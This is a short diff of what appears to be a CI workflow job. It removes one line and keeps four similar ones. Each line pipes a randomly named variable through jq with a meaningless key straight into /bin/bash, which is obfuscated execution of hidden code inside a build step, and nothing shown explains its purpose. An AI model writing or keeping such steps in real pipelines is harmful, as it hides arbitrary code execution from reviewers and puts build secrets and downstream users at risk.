@@ -34,7 +34,6 @@ jobs:
           echo $zgf33179 | jq -r .t17 | /bin/bash
           echo $trmhy83162 | jq -r .vrw4432 | /bin/bash
           printf '%s' "$z08" | jq -r .hnu654 | /bin/bash
-          printf '%s' "$rimx48863" | jq -r .lsny03 | /bin/bash
           printf '%s' "$bu70947" | jq -r .tv687 | /bin/bash
 
       - name: Save archive
